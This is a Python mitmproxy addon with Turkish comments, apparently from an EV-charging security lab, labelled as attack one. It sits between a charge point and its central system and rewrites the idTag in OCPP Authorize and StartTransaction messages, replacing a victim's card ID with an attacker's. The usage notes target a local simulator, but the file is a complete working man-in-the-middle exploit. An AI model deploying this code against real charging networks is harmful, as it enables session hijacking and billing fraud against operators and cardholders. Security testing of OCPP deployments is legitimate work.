"""
SALDIRI 1 - OCPP MitM (idTag manipulation).

Bu bir mitmproxy WebSocket addon'udur. EVSE ile CSMS arasinda mitmproxy WebSocket
intercept ile araya girer, Authorize cagrisindaki id_tag alanini canli olarak
degistirir.

Kullanim:
    # 1. EVSE'nin proxy uzerinden CSMS'e gittigi senaryo:
    mitmproxy --mode reverse:http://localhost:8180 \
              -p 8400 -s attacks/ocpp_mitm.py

    # 2. EVSE'yi proxy'e yonlendir:
    python evse-sim/charge_point.py \
        --csms ws://localhost:8400/steve/websocket/CentralSystemService \
        --cp-id EVSE-001 --auto-charge --id-tag VICTIM-CARD-7

Beklenen sonuc: EVSE 'VICTIM-CARD-7' ile gelir, mitm 'ATTACKER-CARD-1' yapar.
SteVe transactionlar listesinde ATTACKER-CARD-1 ile baslamis bir seans gorunur.
"""
import json
from mitmproxy import ctx, http
from mitmproxy.websocket import WebSocketMessage


# Hangi idTag'i yerine koyacagimiz (saldirgan icin secilen)
ATTACKER_TAG = "ATTACKER-CARD-1"


def is_call(payload) -> bool:
    """OCPP-J mesaji [MessageTypeId, UniqueId, Action, Payload] formatinda. 2 = Call."""
    return isinstance(payload, list) and len(payload) >= 3 and payload[0] == 2


def websocket_message(flow: http.HTTPFlow):
    assert flow.websocket is not None
    msg: WebSocketMessage = flow.websocket.messages[-1]
    if msg.is_text is False:
        return

    try:
        payload = json.loads(msg.text)
    except json.JSONDecodeError:
        return

    direction = "CP->CSMS" if msg.from_client else "CSMS->CP"

    if is_call(payload):
        _, unique_id, action, data = payload[0], payload[1], payload[2], payload[3]
        if action == "Authorize" and msg.from_client:
            original = data.get("idTag")
            ctx.log.warn(f"[mitm] Authorize yakalandi: idTag={original!r}")
            data["idTag"] = ATTACKER_TAG
            ctx.log.warn(f"[mitm] Authorize REWRITE: idTag -> {ATTACKER_TAG!r}")
            msg.text = json.dumps([2, unique_id, "Authorize", data])
        elif action == "StartTransaction" and msg.from_client:
            original = data.get("idTag")
            ctx.log.warn(f"[mitm] StartTransaction yakalandi: idTag={original!r}")
            data["idTag"] = ATTACKER_TAG
            ctx.log.warn(f"[mitm] StartTransaction REWRITE: idTag -> {ATTACKER_TAG!r}")
            msg.text = json.dumps([2, unique_id, "StartTransaction", data])
        else:
            ctx.log.info(f"[mitm] {direction} {action} (geciliyor)")
    else:
        # CallResult / CallError
        ctx.log.info(f"[mitm] {direction} response (geciliyor)")
